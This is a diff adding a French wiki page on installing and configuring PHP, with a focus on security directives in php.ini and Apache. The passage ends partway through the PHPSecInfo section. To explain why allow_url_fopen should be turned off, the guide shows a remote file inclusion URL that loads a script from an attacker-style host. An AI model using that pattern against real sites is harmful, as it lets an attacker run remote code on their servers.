@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="client-nojs">
+<head>
+<meta charset="UTF-8" />
+<title>PHP : Installation et configuration - Deimos.fr / Bloc Notes Informatique</title>
+<meta name="generator" content="MediaWiki 1.25.5" />
+<link rel="shortcut icon" href="https://wiki.deimos.fr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="opensearch_desc.php" title="Deimos.fr / Bloc Notes Informatique (en)" />
+<link rel="EditURI" type="application/rsd+xml" href="https://wiki.deimos.fr/api.php?action=rsd" />
+<link rel="alternate" hreflang="x-default" href="./PHP_:_Installation_et_configuration.html" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.fr" />
+<link rel="alternate" type="application/atom+xml" title="Deimos.fr / Bloc Notes Informatique Atom feed" href="https://wiki.deimos.fr/index.php?title=Special:RecentChanges&amp;feed=atom" />
+<link rel="stylesheet" href="load.php%3Fdebug=false&amp;lang=en&amp;modules=mediawiki.legacy.commonPrint,shared|mediawiki.sectionAnchor|mediawiki.skinning.interface|mediawiki.ui.button|skins.vector.styles&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<link rel="stylesheet" href="load.php%3Fdebug=false&amp;lang=en&amp;modules=site&amp;only=styles&amp;skin=vector&amp;*.css" />
+<style>a:lang(ar),a:lang(kk-arab),a:lang(mzn),a:lang(ps),a:lang(ur){text-decoration:none}
+/* cache key: blocnotesinfo-wiki_:resourceloader:filter:minify-css:7:6f8c0c45eefd74c7bbe9478b32df38c0 */</style>
+<script src="load.php%3Fdebug=false&amp;lang=en&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if(window.mw){
+mw.config.set({"wgCanonicalNamespace":"","wgCanonicalSpecialPageName":false,"wgNamespaceNumber":0,"wgPageName":"PHP_:_Installation_et_configuration","wgTitle":"PHP : Installation et configuration","wgCurRevisionId":8413,"wgRevisionId":8413,"wgArticleId":3064,"wgIsArticle":true,"wgIsRedirect":false,"wgAction":"view","wgUserName":null,"wgUserGroups":["*"],"wgCategories":[],"wgBreakFrames":false,"wgPageContentLanguage":"en","wgPageContentModel":"wikitext","wgSeparatorTransformTable":["",""],"wgDigitTransformTable":["",""],"wgDefaultDateFormat":"dmy","wgMonthNames":["","January","February","March","April","May","June","July","August","September","October","November","December"],"wgMonthNamesShort":["","Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"wgRelevantPageName":"PHP_:_Installation_et_configuration","wgRelevantArticleId":3064,"wgIsProbablyEditable":false,"wgRestrictionEdit":[],"wgRestrictionMove":[],"wgWikiEditorEnabledModules":{"toolbar":true,"dialogs":true,"hidesig":true,"preview":true,"publish":false}});
+}</script><script>if(window.mw){
+mw.loader.implement("user.options",function($,jQuery){mw.user.options.set({"variant":"en"});});mw.loader.implement("user.tokens",function($,jQuery){mw.user.tokens.set({"editToken":"+\\","patrolToken":"+\\","watchToken":"+\\"});});
+/* cache key: blocnotesinfo-wiki_:resourceloader:filter:minify-js:7:a5c52c063dc436c1ca7c9f456936a5e9 */
+}</script>
+<script>if(window.mw){
+mw.loader.load(["mediawiki.page.startup","mediawiki.legacy.wikibits","mediawiki.legacy.ajax","skins.vector.js"]);
+}</script>
+<style type="text/css">/*<![CDATA[*/
+.source-apache {line-height: normal;}
+.source-apache li, .source-apache pre {
+	line-height: normal; border: 0px none white;
+}
+/**
+ * GeSHi Dynamically Generated Stylesheet
+ * --------------------------------------
+ * Dynamically generated stylesheet for apache
+ * CSS class: source-apache, CSS id: 
+ * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2008 Benny Baumann
+ * (http://qbnz.com/highlighter/ and http://geshi.org/)
+ * --------------------------------------
+ */
+.apache.source-apache .de1, .apache.source-apache .de2 {font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;font-family: monospace, monospace;}
+.apache.source-apache  {font-family:monospace;}
+.apache.source-apache .imp {font-weight: bold; color: red;}
+.apache.source-apache li, .apache.source-apache .li1 {font-weight: normal; vertical-align:top;}
+.apache.source-apache .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
+.apache.source-apache .li2 {font-weight: bold; vertical-align:top;}
+.apache.source-apache .kw1 {color: #00007f;}
+.apache.source-apache .kw2 {color: #0000ff;}
+.apache.source-apache .kw3 {color: #000000; font-weight:bold;}
+.apache.source-apache .co1 {color: #adadad; font-style: italic;}
+.apache.source-apache .es0 {color: #000099; font-weight: bold;}
+.apache.source-apache .br0 {color: #339933;}
+.apache.source-apache .sy0 {color: #008000;}
+.apache.source-apache .st0 {color: #7f007f;}
+.apache.source-apache .nu0 {color: #ff0000;}
+.apache.source-apache .ln-xtra, .apache.source-apache li.ln-xtra, .apache.source-apache div.ln-xtra {background-color: #ffc;}
+.apache.source-apache span.xtra { display:block; }
+
+/*]]>*/
+</style>
+<style type="text/css">/*<![CDATA[*/
+.source-ini {line-height: normal;}
+.source-ini li, .source-ini pre {
+	line-height: normal; border: 0px none white;
+}
+/**
+ * GeSHi Dynamically Generated Stylesheet
+ * --------------------------------------
+ * Dynamically generated stylesheet for ini
+ * CSS class: source-ini, CSS id: 
+ * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2008 Benny Baumann
+ * (http://qbnz.com/highlighter/ and http://geshi.org/)
+ * --------------------------------------
+ */
+.ini.source-ini .de1, .ini.source-ini .de2 {font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;font-family: monospace, monospace;}
+.ini.source-ini  {font-family:monospace;}
+.ini.source-ini .imp {font-weight: bold; color: red;}
+.ini.source-ini li, .ini.source-ini .li1 {font-weight: normal; vertical-align:top;}
+.ini.source-ini .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
+.ini.source-ini .li2 {font-weight: bold; vertical-align:top;}
+.ini.source-ini .co0 {color: #666666; font-style: italic;}
+.ini.source-ini .sy0 {color: #000066; font-weight:bold;}
+.ini.source-ini .st0 {color: #933;}
+.ini.source-ini .re0 {color: #000066; font-weight:bold;}
+.ini.source-ini .re1 {color: #000099;}
+.ini.source-ini .re2 {color: #660066;}
+.ini.source-ini .ln-xtra, .ini.source-ini li.ln-xtra, .ini.source-ini div.ln-xtra {background-color: #ffc;}
+.ini.source-ini span.xtra { display:block; }
+
+/*]]>*/
+</style>
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/skins/Vector/csshover.min.htc")}</style><![endif]-->
+</head>
+<body class="mediawiki ltr sitedir-ltr ns-0 ns-subject page-PHP_Installation_et_configuration skin-vector action-view vector-animateLayout">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<div id="content" class="mw-body" role="main">
+			<a id="top"></a>
+
+						<h1 id="firstHeading" class="firstHeading" lang="en"><span dir="auto">PHP : Installation et configuration</span></h1>
+						<div id="bodyContent" class="mw-body-content">
+									<div id="siteSub">From Deimos.fr / Bloc Notes Informatique</div>
+								<div id="contentSub"></div>
+												<div id="jump-to-nav" class="mw-jump">
+					Jump to:					<a href="./PHP_:_Installation_et_configuration.html#mw-navigation">navigation</a>, 					<a href="./PHP_:_Installation_et_configuration.html#p-search">search</a>
+				</div>
+				<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><div id="toc" class="toc"><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="./PHP_:_Installation_et_configuration.html#Introduction"><span class="tocnumber">1</span> <span class="toctext">Introduction</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="./PHP_:_Installation_et_configuration.html#Installation"><span class="tocnumber">2</span> <span class="toctext">Installation</span></a></li>
+<li class="toclevel-1 tocsection-3"><a href="./PHP_:_Installation_et_configuration.html#Configuration_depuis_Apache"><span class="tocnumber">3</span> <span class="toctext">Configuration depuis Apache</span></a></li>
+<li class="toclevel-1 tocsection-4"><a href="./PHP_:_Installation_et_configuration.html#Configuration_dans_les_fichiers_php.ini"><span class="tocnumber">4</span> <span class="toctext">Configuration dans les fichiers php.ini</span></a>
+<ul>
+<li class="toclevel-2 tocsection-5"><a href="./PHP_:_Installation_et_configuration.html#Structure_du_fichier_php.ini"><span class="tocnumber">4.1</span> <span class="toctext">Structure du fichier php.ini</span></a></li>
+<li class="toclevel-2 tocsection-6"><a href="./PHP_:_Installation_et_configuration.html#Les_directives_du_fichier_php.ini"><span class="tocnumber">4.2</span> <span class="toctext">Les directives du fichier php.ini</span></a>
+<ul>
+<li class="toclevel-3 tocsection-7"><a href="./PHP_:_Installation_et_configuration.html#Gestion_de_l.E2.80.99en-t.C3.AAte_du_serveur"><span class="tocnumber">4.2.1</span> <span class="toctext">Gestion de l’en-tête du serveur</span></a></li>
+<li class="toclevel-3 tocsection-8"><a href="./PHP_:_Installation_et_configuration.html#Gestion_des_erreurs"><span class="tocnumber">4.2.2</span> <span class="toctext">Gestion des erreurs</span></a></li>
+<li class="toclevel-3 tocsection-9"><a href="./PHP_:_Installation_et_configuration.html#Gestion_des_acc.C3.A8s_aux_fichiers"><span class="tocnumber">4.2.3</span> <span class="toctext">Gestion des accès aux fichiers</span></a></li>
+<li class="toclevel-3 tocsection-10"><a href="./PHP_:_Installation_et_configuration.html#Gestion_des_fonctions_et_classes_accessibles"><span class="tocnumber">4.2.4</span> <span class="toctext">Gestion des fonctions et classes accessibles</span></a></li>
+<li class="toclevel-3 tocsection-11"><a href="./PHP_:_Installation_et_configuration.html#Gestion_des_limites_de_m.C3.A9moire_et_de_temps"><span class="tocnumber">4.2.5</span> <span class="toctext">Gestion des limites de mémoire et de temps</span></a></li>
+<li class="toclevel-3 tocsection-12"><a href="./PHP_:_Installation_et_configuration.html#Modifier_les_directives_depuis_PHP"><span class="tocnumber">4.2.6</span> <span class="toctext">Modifier les directives depuis PHP</span></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-13"><a href="./PHP_:_Installation_et_configuration.html#Audit_de_s.C3.A9curit.C3.A9_avec_PHPSecInfo"><span class="tocnumber">5</span> <span class="toctext">Audit de sécurité avec PHPSecInfo</span></a></li>
+<li class="toclevel-1 tocsection-14"><a href="./PHP_:_Installation_et_configuration.html#Conclusion"><span class="tocnumber">6</span> <span class="toctext">Conclusion</span></a></li>
+</ul>
+</div>
+
+<h1><span class="mw-headline" id="Introduction"><span class="mw-headline-number">1</span> Introduction</span></h1>
+<p>Même si PHP fonctionne très bien avec sa configuration initiale, il est parfois essentiel de modifier certains paramètres, et ce, notamment pour des raisons de sécurité. Cet article montre comment adapter la configuration de PHP à l’environnement de vos applications.
+</p><p>Il n’est pas très difficile d’installer PHP sur un serveur et d’obtenir un système opérationnel. En général, on se contente d’ailleurs de cela: installer PHP. Mais est-ce suffisant&#160;? N’avez-vous jamais eu besoin d’installer une extension, de modifier la taille maximale de la mémoire allouée à PHP&#160;?... De plus, une partie critique de la sécurisation de vos applications s’effectue à ce niveau. Dans cet article, nous verrons en détail les différentes options de configuration de PHP et comment les modifier. Certaines options doivent être activées à la compilation de PHP, d’autres peuvent être modifiées dans Apache, et, enfin, pour la plupart d’entre elles, c’est dans le(s) fichier(s) php.ini qu’il faudra effectuer les modifications. Pour conclure, je vous présenterai PHPSecInfo, un petit utilitaire qui analyse pour vous les options de sécurité que vous avez choisi d’appliquer à PHP.
+</p>
+<h1><span class="mw-headline" id="Installation"><span class="mw-headline-number">2</span> Installation</span></h1>
+<p>La première des configurations possibles se situe au moment de la compilation: elle permet de modifier certains paramètres et d’ajouter des extensions à PHP. J’entends "première" dans le sens d’ordre chronologique lors de l’installation de PHP et non dans le sens de "principale" (voir la section sur les fichiers php.ini en section 3).
+</p><p>Pour compiler PHP, il vous faut récupérer les sources de PHP sur <a rel="nofollow" class="external free" href="http://www.php.net/downloads">http://www.php.net/downloads</a> et les décompresser dans un répertoire que nous nommerons php-sources/. La compilation de PHP est ensuite très simple et se déroule en deux étapes:
+</p>
+<ul><li> La phase de configuration permettant de sélectionner les options à activer et les extensions à installer. Cela se fait à l’aide de la commande ./configure (pour une liste des options disponibles sur votre système: ./configure -help – pour <a rel="nofollow" class="external text" href="http://www.php.net/manual/fr/configure.php">une liste complète</a>). L’installation des extensions se fait à l’aide de l’option --with-extension où extension est le nom d’une extension autorisée (gd, mysql, pdo, etc.). Ainsi pour installer l’extension gd (bibliothèque graphique), on effectuera&#160;:</li></ul>
+<table width="100%" class="command_array">
+<tr>
+<td class="command_subarray"> <font size="-1"><a href="./File:Terminal.png.html" class="image" title="Command"><img alt="Command" src="images/9/9c/Terminal.png" width="32" height="32" /></a> configure</font>
+</td></tr>
+<tr>
+<td>
+<pre>./configure –with-gd
+</pre>
+</td></tr></table><br />
+<ul><li> Ensuite, la phase de compilation proprement dite qui s’effectue à l’aide de la commande&#160;:</li></ul>
+<table width="100%" class="command_array">
+<tr>
+<td class="command_subarray"> <font size="-1"><a href="./File:Terminal.png.html" class="image" title="Command"><img alt="Command" src="images/9/9c/Terminal.png" width="32" height="32" /></a> make</font>
+</td></tr>
+<tr>
+<td>
+<pre>make all install
+</pre>
+</td></tr></table><br />
+<p>Notons toutefois que l’installation des extensions disponibles par cette méthode se fait de manière beaucoup plus simple sur les systèmes basés sur Debian en utilisant le système apt (apt-cache search php5 pour afficher les bibliothèques disponibles). Ainsi, toujours pour installer la bibliothèque gd, on effectuera cette fois&#160;:
+</p>
+<table width="100%" class="command_array">
+<tr>
+<td class="command_subarray"> <font size="-1"><a href="./File:Terminal.png.html" class="image" title="Command"><img alt="Command" src="images/9/9c/Terminal.png" width="32" height="32" /></a> apt-get</font>
+</td></tr>
+<tr>
+<td>
+<pre>apt-get install php5-gd
+</pre>
+</td></tr></table><br />
+<p>Ce qui nous dispensera de la phase de compilation...
+</p><p>D’autres extensions sont disponibles à travers le système <a rel="nofollow" class="external text" href="http://pecl.php.net">PECL</a>, mais nous sortirions du cadre de cet article. Revenons maintenant aux paramètres modifiables à l’aide de la commande ./configure. Je ne vous en présenterai que quelques-uns dans le tableau suivant, la liste complète et détaillée étant disponible sur le manuel de <a rel="nofollow" class="external text" href="http://pear.php.net/manual/fr/standards.php">PHP</a>.
+</p><p><a href="./File:Php1.jpg.html" class="image"><img alt="Php1.jpg" src="images/e/ed/Php1.jpg" width="502" height="175" /></a>
+</p><p>L’activation de ces options se fera à l’aide d’une commande du type:
+</p>
+<table width="100%" class="command_array">
+<tr>
+<td class="command_subarray"> <font size="-1"><a href="./File:Terminal.png.html" class="image" title="Command"><img alt="Command" src="images/9/9c/Terminal.png" width="32" height="32" /></a> configure</font>
+</td></tr>
+<tr>
+<td>
+<pre>./configure --disable-short-tags
+</pre>
+</td></tr></table><br />
+<p>suivie de:
+</p>
+<table width="100%" class="command_array">
+<tr>
+<td class="command_subarray"> <font size="-1"><a href="./File:Terminal.png.html" class="image" title="Command"><img alt="Command" src="images/9/9c/Terminal.png" width="32" height="32" /></a> make</font>
+</td></tr>
+<tr>
+<td>
+<pre>make all install
+</pre>
+</td></tr></table><br />
+<p>Penchons-nous maintenant sur un autre aspect de la configuration: Apache.
+</p>
+<h1><span class="mw-headline" id="Configuration_depuis_Apache"><span class="mw-headline-number">3</span> Configuration depuis Apache</span></h1>
+<p>Il est parfois intéressant de modifier le comportement de PHP seulement pour quelques projets hébergés dans des répertoires bien définis.
+</p><p>Si vous avez compilé PHP en tant que module Apache (voir section1), vous pouvez utiliser le fichier de configuration d’Apache (en général fichier /etc/apache2/apache2.conf) et les fichiers .htaccess (à condition que la directive AllowOverride du répertoire contenant le fichier ait été positionnée à la valeur Options ou All) pour modifier la configuration de PHP.
+</p><p>Il existe de nombreuses directives Apache qui vous permettent de modifier la configuration de PHP à partir des fichiers de configuration Apache. La liste complète de ces directives est donnée dans le manuel de PHP[4]. Notez toutefois qu’un type a été attribué à chaque directive. Ce type permet de définir des droits de modifications pour savoir à partir de quel fichier on a le droit de le modifier. Il y a 4 types possibles:
+</p>
+<ul><li> PHP_INI_SYSTEM: les entrées peuvent être définies dans le fichier php.ini ou le fichier apache2.conf;</li>
+<li> PHP_INI_PERDIR: les entrées peuvent être définies dans le fichier php.ini, un fichier .htaccess ou le fichier apache2.conf;</li>
+<li> PHP_INI_USER: les entrées peuvent être définies dans les scripts utilisateurs;</li>
+<li> PHP_INI_ALL: les entrées peuvent être définies n’importe où.</li></ul>
+<p>Il faudra donc faire très attention au type de chaque <a rel="nofollow" class="external text" href="http://www.php.net/manual/fr/ini.php">directive</a> pour savoir dans quel fichier la modification est autorisée.
+</p><p>Pour pouvoir modifier la valeur d’une directive, on utilisera suivant les cas:
+</p>
+<ol><li> Pour les directives de type PHP_INI_ALL (inclut notamment PHP_INI_USER) et PHP_INI_PERDIR:</li></ol>
+<ul><li> php_flag nom valeur</li></ul>
+<p>Cette instruction modifie la valeur de la directive nom en lui assignant une valeur dont le type est booléen et vaut soit on, soit off. Par exemple, pour la directive assert_warning (type PHP_INI_ALL) qui met une alerte PHP pour chaque assertion échouée, la modification se fait par:
+</p>
+<pre>php_flag assert_warning off
+</pre>
+<ul><li> php_value nom valeur</li></ul>
+<p>Cette instruction modifie la valeur de la directive nom en lui assignant une valeur. Par exemple, pour la directive include_path (type PHP_INI_ALL) qui permet de donner une liste de répertoires où les fonctions require(), include(), fopen(), file(), readfile() et file_get_contents() chercheront les fichiers, la modification se fait par:
+</p>
+<pre>php_value include_path “.:/usr/lib/php”
+</pre>
+<ol><li> Pour les directives de type PHP_INI_SYSTEM ou pour les directives dont l’administrateur ne veut pas que l’utilisateur puisse surcharger les valeurs dans un fichier .htaccess:</li></ol>
+<ul><li> php_admin_flag nom valeur</li></ul>
+<p>Cette instruction a le même comportement que l’instruction php_flag vue précédemment. Elle ne peut être utilisée que dans le fichier apache2.conf par l’administrateur.
+</p>
+<ul><li> php_admin_value nom valeur</li></ul>
+<p>Là encore, cette instruction se comporte comme php_value et ne peut être utilisée que dans le fichier apache2.conf par l’administrateur.
+</p><p>Notez bien que les constantes PHP ne sont bien sûr pas accessibles dans le fichier de configuration d’Apache. Ainsi, pour modifier la directive de rapport d’erreurs error_reporting, vous ne pourrez pas utiliser les constantes de la famille E_STRICT, mais la valeur qui leur est associée.
+</p><p>Pour finir avec cette partie de configuration à partir d’Apache, je vous propose un petit exemple: nous possédons un petit site hébergé sur /var/www/site. L’administrateur souhaite fixer le nom du répertoire temporaire utilisé pour stocker les fichiers lors du chargement (directive upload_tmp_dir), puis un utilisateur du site souhaite pouvoir envoyer des fichiers plus volumineux qu’en temps normal dans sa partie administration (répertoire user/).
+</p><p>Pour l’administrateur, la modification portera sur le fichier apache2.conf:
+</p>
+<table width="100%" class="config_array">
+<tr>
+<td class="config_subarray"> <font size="-1"><a href="./File:Configuration_file.png.html" class="image" title="Configuration File"><img alt="Configuration File" src="images/a/a6/Configuration_file.png" width="32" height="32" /></a> /etc/apache2/apache2.conf</font>
+</td></tr>
+<tr>
+<td><div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="apache source-apache"><pre class="de1">&lt;<span class="kw3">Directory</span> /web/site1/online/&gt;
+    <span class="kw1">AllowOverride</span> <span class="kw2">All</span>
+    <span class="kw1">php_admin_value</span> upload_tmp_dir <span class="st0">&quot;/var/www/site/tmp&quot;</span>
+&lt;/<span class="kw3">Directory</span>&gt;</pre></div></div>
+</td></tr></table><br />
+<p>Pour l’utilisateur, la modification se fera dans /var/www/site/user/.htaccess:
+</p>
+<table width="100%" class="config_array">
+<tr>
+<td class="config_subarray"> <font size="-1"><a href="./File:Configuration_file.png.html" class="image" title="Configuration File"><img alt="Configuration File" src="images/a/a6/Configuration_file.png" width="32" height="32" /></a> /var/www/site/user/.htaccess</font>
+</td></tr>
+<tr>
+<td><div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="ini source-ini"><pre class="de1"> php_value upload_max_filesize 2M</pre></div></div>
+</td></tr></table><br />
+<p>Intéressons-nous maintenant au cas de configuration le plus classique, celui des fichiers php.ini.
+</p>
+<h1><span class="mw-headline" id="Configuration_dans_les_fichiers_php.ini"><span class="mw-headline-number">4</span> Configuration dans les fichiers php.ini</span></h1>
+<p>Parler "du" fichier php.ini est un abus de langage: il n’y a pas un, mais des fichiers de configuration php.ini. En effet, lorsque vous installez PHP en tant que serveur, il faudra modifier le fichier de configuration associé à Apache: /etc/php5/apache2/php.ini (sur une distribution basée sur Debian). Or, PHP peut également être utilisé en ligne de commande; on parle alors de PHP-CLI (pour Command Line Interface). Ce mode spécifique, utilisé entre autres par PEAR et PECL, possède son propre fichier de configuration: /etc/php5/cli/php.ini. Faites donc très attention, car bien qu’identiques au départ, toute modification de configuration sur l’un des systèmes n’impactera pas le second! De plus, si toute modification du fichier php.ini lié à PHP-CLI est effective immédiatement, pour activer les modifications appliquées au fichier php.ini lié à Apache, il faudra penser à redémarrer le serveur (/etc/init.d/apache2 restart).
+</p><p>Cette mise au point effectuée, je vous propose d’analyser la structure d’un fichier php.ini et de disséquer quelques directives ayant trait à la sécurité pour savoir à quoi elles servent et quelles sont leurs valeurs possibles et éventuellement souhaitables en fonction du contexte.
+</p>
+<h2><span class="mw-headline" id="Structure_du_fichier_php.ini"><span class="mw-headline-number">4.1</span> Structure du fichier php.ini</span></h2>
+<p>Le fichier php.ini est un fichier texte divisé en plusieurs sections. Chacune des sections est identifiée par un nom et contient des variables relatives à ladite section. Chaque section possède la structure suivante:
+</p>
+<table width="100%" class="config_array">
+<tr>
+<td class="config_subarray"> <font size="-1"><a href="./File:Configuration_file.png.html" class="image" title="Configuration File"><img alt="Configuration File" src="images/a/a6/Configuration_file.png" width="32" height="32" /></a> /etc/php5/php.ini</font>
+</td></tr>
+<tr>
+<td><div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="ini source-ini"><pre class="de1"><span class="re0"><span class="br0">&#91;</span>NomDeSection<span class="br0">&#93;</span></span>
+<span class="re1">variable</span>  <span class="sy0">=</span><span class="st0">&quot;valeur&quot;</span>
+...
+<span class="re1">variable_n</span><span class="sy0">=</span><span class="st0">&quot;valeur_n&quot;</span></pre></div></div>
+</td></tr></table><br />
+<p>Le nom de la section est indiqué entre crochets, suivi d’un certain nombre de déclarations de variables – encore appelées directives – sous forme de paires constituées du nom de la variable (sensible à la casse) et de la valeur qui lui est associée (numérique, booléenne ou chaîne de caractères). Notez que chaque déclaration de variable se fait sur une nouvelle ligne.
+</p><p>Enfin, le caractère ";" signale un commentaire. Ainsi, il est facile de désactiver une fonctionnalité PHP en mettant en commentaire la ligne qui lui est associée (et réciproquement de la réactiver en la dé-commentant).
+</p><p>Voyons maintenant quelles sont les fonctionnalités que l’on va pouvoir modifier.
+</p>
+<h2><span class="mw-headline" id="Les_directives_du_fichier_php.ini"><span class="mw-headline-number">4.2</span> Les directives du fichier php.ini</span></h2>
+<p>Nous aborderons ici les directives liées à la sécurité de PHP (pour une liste complète des directives, reportez-vous comme toujours au manuel PHP). Lorsque l’on s’intéresse à la sécurité de PHP, il faut garder à l’esprit qu’il existe essentiellement deux contextes dans lesquels un serveur peut être utilisé?: le développement et la production. Ainsi, il est, par exemple, recommandé de désactiver l’affichage des erreurs sur un serveur en production... mais, il est nettement plus pratique de conserver cet affichage en développement?! Voici donc une liste (non restrictive) de directives auxquelles il faudra prêter attention.
+</p>
+<h3><span class="mw-headline" id="Gestion_de_l.E2.80.99en-t.C3.AAte_du_serveur"><span class="mw-headline-number">4.2.1</span> Gestion de l’en-tête du serveur</span></h3>
+<ul><li> expose_php?:</li></ul>
+<p>Cette directive indique à PHP d’ajouter son numéro de version à l’en-tête standard du serveur web. Il est recommandé de désactiver cette directive en production (valeur Off)?: les informations données peuvent servir à d’éventuels pirates si vous ne mettez pas régulièrement à jour votre serveur.
+</p>
+<h3><span class="mw-headline" id="Gestion_des_erreurs"><span class="mw-headline-number">4.2.2</span> Gestion des erreurs</span></h3>
+<ul><li> display_errors?:</li></ul>
+<p>Cette directive autorise l’affichage des erreurs PHP?: en production, elle doit être positionnée sur Off (sous peine de fournir de précieuses informations à un éventuel pirate comme le nom de vos tables, etc.) et, bien sûr, en développement, il faudra lui associer la valeur On.
+</p>
+<ul><li> error_reporting?:</li></ul>
+<p>Indique les types des erreurs que PHP devra reporter. Lorsque l’on choisit de les afficher, il est recommandé d’afficher un maximum de messages d’erreurs. Les valeurs recommandées pour PHP5 sont E_ALL | E_STRICT et E_ALL pour PHP4.
+</p>
+<ul><li> log_errors?:</li></ul>
+<p>Indique à PHP de conserver une liste des erreurs rencontrées dans un fichier de log. Il est utile d’activer cette directive même en production pour un suivi des erreurs sans affichage direct.
+</p>
+<ul><li> error_log?:</li></ul>
+<p>Si la directive log_errors a été positionnée à On, la directive error_log permet de spécifier le nom et le chemin du fichier de log que vous désirez utiliser. Sinon le fichier par défaut sera le fichier error.log de votre Apache (/var/log/apache2/error.inc sur les distributions basées sur Debian).
+</p>
+<ul><li> html_errors?:</li></ul>
+<p>Active ou désactive les balises HTML dans les messages d’erreurs?: si vous avez choisi de ne pas afficher les erreurs (display_errors à Off), cette directive est inutile. Par contre, en développement, en renseignant les directives docref_root et docref_ext, vous pourrez avoir directement des liens vers la documentation de la fonction ayant provoqué l’erreur.
+</p>
+<ul><li> docref_root?:</li></ul>
+<p>Cette directive définit le chemin vers le manuel PHP. En général, il s’agira de?:
+</p>
+<pre>docref_root?=?<a rel="nofollow" class="external free" href="http://fr.php.net/manual/fr/">http://fr.php.net/manual/fr/</a>.
+</pre>
+<ul><li> docref_ext?:</li></ul>
+<p>Définit l’extension des fichiers du manuel. Là encore, il s’agira en général de fichiers HTML?: docref_ext?=?.html.
+</p>
+<h3><span class="mw-headline" id="Gestion_des_acc.C3.A8s_aux_fichiers"><span class="mw-headline-number">4.2.3</span> Gestion des accès aux fichiers</span></h3>
+<ul><li> allow_url_fopen?:</li></ul>
+<p>Cette directive autorise l’exécution de fichiers distants passés en paramètre d’une URL. Il est recommandé de la désactiver (valeur Off)?: un pirate pourrait faire exécuter un code externe. Si vous disposez d’une page index.php qui attend un paramètre load, un pirate pourrait exécuter?:
+</p>
+<pre>index.php?load=<a rel="nofollow" class="external free" href="http://www.the-hacker.com/script_pirate.txt">http://www.the-hacker.com/script_pirate.txt</a>
+</pre>
+<ul><li> open_basedir?:</li></ul>
+<p>Cette directive limite les fichiers accessibles par PHP dans l’arborescence. Le paramètre passé à open_basedir est considéré comme un préfixe?: si vous spécifiez open_basedir?=?/include/mon_rep, vous donnerez accès à /include/mon_rep, /include/mon_repertoire,... Pour déterminer un répertoire spécifique, il faudra terminer le nom du chemin par un "?/?".
+</p>
+<h3><span class="mw-headline" id="Gestion_des_fonctions_et_classes_accessibles"><span class="mw-headline-number">4.2.4</span> Gestion des fonctions et classes accessibles</span></h3>
+<ul><li> disable_functions et disable_classes?:</li></ul>
+<p>Ces directives permettent d’interdire respectivement une liste de fonctions et une liste de classes "?dangereuses?". Pour interdire par exemple l’utilisation des fonctions phpinfo() et system(), il faudra spécifier?: disable_functions?=?phpinfo, system.
+</p>
+<h3><span class="mw-headline" id="Gestion_des_limites_de_m.C3.A9moire_et_de_temps"><span class="mw-headline-number">4.2.5</span> Gestion des limites de mémoire et de temps</span></h3>
+<ul><li> memory_limit?:</li></ul>
+<p>Cette directive détermine la mémoire limite, en octets, qu’un script est autorisé à allouer. Depuis PHP 5.2.0, la valeur par défaut est fixée à 16M. Il s’agit d’une valeur raisonnable (on préconisait auparavant une valeur de 8M).
+</p>
+<ul><li> post_max_size?:</li></ul>
+<p>Définit la taille maximale des données (en octets) reçues par la méthode POST (la directive memory_limit doit avoir une valeur supérieure à celle-ci, sinon post_max_size sera limité à la valeur de memory_limit). La valeur par défaut est de 8M. Il est peu probable que vous ayez besoin de plus de mémoire (vous pouvez même éventuellement descendre un peu cette valeur). Toutefois, lors de l’upload de fichiers, les données transitent via une méthode POST?: assurez-vous alors que cette valeur est supérieure à celle de la directive upload_max_filesize.
+</p>
+<ul><li> max_execution_time?:</li></ul>
+<p>Temps maximal d’exécution des scripts en secondes. Par défaut, la valeur est de 30s, mais n’oubliez pas qu’il est rare qu’un utilisateur patiente autant de temps... Cette directive permet surtout de sortir de boucles infinies en phase de développement. Un bon compromis semble être 15s.
+</p>
+<h3><span class="mw-headline" id="Modifier_les_directives_depuis_PHP"><span class="mw-headline-number">4.2.6</span> Modifier les directives depuis PHP</span></h3>
+<p>Il est également possible de modifier des directives du fichier php.ini de manière ponctuelle directement dans des scripts PHP. On utilise alors la fonction ini_set() [5]. Cette fonction admet deux paramètres?: le nom de la directive à modifier et la nouvelle valeur à lui affecter. Par exemple, pour désactiver l’affichage des erreurs?:
+</p>
+<pre>ini_set(‘display_errors’, ‘Off’);
+</pre>
+<h1><span class="mw-headline" id="Audit_de_s.C3.A9curit.C3.A9_avec_PHPSecInfo"><span class="mw-headline-number">5</span> Audit de sécurité avec PHPSecInfo</span></h1>
+<p>Pour contrôler les points de sécurité les plus classiques, il existe un outil, PHPSecInfo [6], qui examinera les valeurs que vous avez affectées aux diverses directives du fichier php.ini. Il ne s’agit bien sûr que d’une vérification des points les plus courants, mais, après avoir décompressé le fichier que vous trouverez sur <a rel="nofollow" class="external free" href="http://phpsec.org/projects/phpsecinfo/phpsecinfo.zip">http://phpsec.org/projects/phpsecinfo/phpsecinfo.zip</a>, vous obtiendrez un rapport similaire à celui de la figure?1 indiquant les points faibles de votre configuration pour chaque directive. Les résultats sont exprimés en fonction d’un code couleur?:
+</p>
+<ul><li> vert?: tout va bien?;</li>
+<li> jaune?: mauvaise valeur de configuration possible?;</li>
